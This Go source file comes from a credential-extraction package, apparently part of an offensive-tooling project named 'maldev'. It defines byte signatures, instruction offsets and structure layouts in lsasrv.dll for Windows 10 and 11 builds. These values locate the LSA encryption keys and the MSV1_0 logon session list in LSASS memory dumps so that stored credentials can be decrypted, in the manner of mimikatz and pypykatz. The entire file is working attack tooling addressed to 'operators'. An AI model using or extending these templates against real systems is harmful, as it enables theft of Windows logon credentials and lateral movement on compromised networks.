package lsasparse

// Built-in Templates for the most-common Win10 / Win11 builds.
//
// These values are *facts* about Microsoft's compiled lsasrv.dll —
// byte signatures present in the binary, offset distances between
// instruction sequences, and field positions inside Microsoft data
// structures. Facts are not copyrightable (Feist v. Rural). The code
// that uses them is an independent re-implementation in Go.
//
// Research source — every credential-extraction tool reuses these
// patterns because they are empirical observations:
//
//   - pypykatz (GPL-3, Skelsec) —
//       pypykatz/lsadecryptor/lsa_template_nt6.py
//       pypykatz/lsadecryptor/packages/msv/templates.py
//   - mimikatz (CC-BY-NC-SA, Benjamin Delpy "gentilkiwi") —
//       mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_*.c
//
// We do not vendor or translate either project's source code; only
// the documented byte values are carried into our Template structs.
// maldev itself remains MIT — the same way pypykatz is GPL-3 despite
// being inspired by mimikatz's CC-BY-NC-SA research.
//
// Operators on a build we don't cover register additional Templates
// via RegisterTemplate at runtime; the lookup picks the first match
// whose [BuildMin, BuildMax] window covers the dump's BuildNumber.

// init registers every built-in template at package load. Tests that
// need a clean registry call resetTemplates() then register their
// own — the defaults won't survive a reset, which is what those
// tests want.
func init() {
	registerDefaultTemplates()
}

// registerDefaultTemplates registers every built-in template.
// Exposed (lowercase) so tests can re-prime the registry after a
// resetTemplates() call without re-importing the package.
func registerDefaultTemplates() {
	for _, t := range builtinTemplates {
		_ = RegisterTemplate(t)
	}
}

// lsaSignatureCommon — 16 bytes from `LsaInitializeProtectedMemory`
// in lsasrv.dll, valid across Win10 19H1 → 22H2 and Win11 21H2 →
// 22H2 (pre-22622). The trailing `48 8D 15` is the LEA that loads
// the AES key-handle pointer; the rel32 starts at match +0x10.
//
//	83 64 24 30 00     and    dword ptr [rsp+30h], 0
//	48 8D 45 E0        lea    rax, [rbp-20h]
//	44 8B 4D D8        mov    r9d, dword ptr [rbp-28h]
//	48 8D 15           lea    rdx, [rip+rel32]   ← AES key handle
var lsaSignatureCommon = []byte{
	0x83, 0x64, 0x24, 0x30, 0x00,
	0x48, 0x8D, 0x45, 0xE0,
	0x44, 0x8B, 0x4D, 0xD8,
	0x48, 0x8D, 0x15,
}

// msvSignatureCommon — 12 bytes from the MSV1_0 LogonSessionList
// bootstrap path inside lsasrv.dll. The rel32 to the list head sits
// at match +23.
//
//	33 FF              xor    edi, edi
//	41 89 37           mov    dword ptr [r15], esi
//	4C 8B F3           mov    r14, rbx
//	45 85 C0           test   r8d, r8d
//	74 ??              je     short ...
var msvSignatureCommon = []byte{
	0x33, 0xFF,
	0x41, 0x89, 0x37,
	0x4C, 0x8B, 0xF3,
	0x45, 0x85, 0xC0,
	0x74,
}

// msvLayoutKiwiList63 — KIWI_MSV1_0_LIST_63-style node layout used
// by Win10 1903 → 22H2 and Win11 21H2 → 22H2. Field offsets are
// byte distances from the start of the _MSV1_0_LOGON_SESSION node.
var msvLayoutKiwiList63 = MSVLayout{
	NodeSize:          0x180,
	LUIDOffset:        0x70,
	UserNameOffset:    0x90,
	LogonDomainOffset: 0xA0,
	LogonServerOffset: 0xF8,
	LogonTypeOffset:   0xD8,
	LogonTimeOffset:   0xF0,
	SIDOffset:         0xD0,
	CredentialsOffset: 0x108,
}

// builtinTemplates is the canonical default set. init() registers
// each one. Adding a build means appending a new entry here.
var builtinTemplates = []*Template{
	{
		// Win10 19H1 (1903) → 22H2 (build 18362–19045).
		BuildMin:                18362,
		BuildMax:                19045,
		IVPattern:               lsaSignatureCommon,
		IVOffset:                0x43,
		Key3DESPattern:          lsaSignatureCommon,
		Key3DESOffset:           -0x59,
		KeyAESPattern:           lsaSignatureCommon,
		KeyAESOffset:            0x10,
		LogonSessionListPattern: msvSignatureCommon,
		LogonSessionListOffset:  23,
		LogonSessionListCount:   32,
		MSVLayout:               msvLayoutKiwiList63,
	},
	{
		// Win11 21H2 → 22H2 pre-22622 (build 22000–22621). Builds
		// 22622+ use a different MSV signature
		// (45 89 34 24 4C 8B FF 8B F3 45 85 C0 74) and would need a
		// distinct entry — not shipped until offsets are validated
		// against a real binary.
		BuildMin:                22000,
		BuildMax:                22621,
		IVPattern:               lsaSignatureCommon,
		IVOffset:                0x43,
		Key3DESPattern:          lsaSignatureCommon,
		Key3DESOffset:           -0x59,
		KeyAESPattern:           lsaSignatureCommon,
		KeyAESOffset:            0x10,
		LogonSessionListPattern: msvSignatureCommon,
		LogonSessionListOffset:  23,
		LogonSessionListCount:   32,
		MSVLayout:               msvLayoutKiwiList63,
	},
}
